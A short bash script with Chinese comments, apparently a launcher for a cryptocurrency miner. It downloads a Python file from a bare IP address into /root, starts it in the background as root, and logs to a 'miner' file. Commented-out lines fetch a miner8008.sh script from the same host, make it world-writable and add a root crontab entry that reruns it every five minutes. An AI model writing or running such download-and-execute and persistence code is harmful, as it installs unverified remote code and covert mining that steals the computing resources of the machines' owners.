#!/bin/bash

#wget http://150.158.140.31/miner8008.sh&&chmod 777 miner8008.sh;tail /etc/crontab
#echo  "*/5 *    * * *   root  /root/miner8008.sh"  >> /etc/crontab
# 检查/root目录下是否存在khd.py文件
if [ ! -f /root/khd.py ]; then
    # 如果文件不存在，则使用wget下载文件
    wget http://150.158.140.31:8888/down/UT3659UNLvg0 -P /root/
    echo "下载完成"
else
    echo "文件已存在"
fi

# 检查进程是否存在khd.py，如果不存在则运行
if ! ps aux|grep khd.py|grep -v grep > /dev/null; then
    nohup python3 /root/khd.py > /run/mineri8008.log 2>&1 &
    echo "khd.py 运行中"
else
    echo "khd.py 进程已存在"
fi
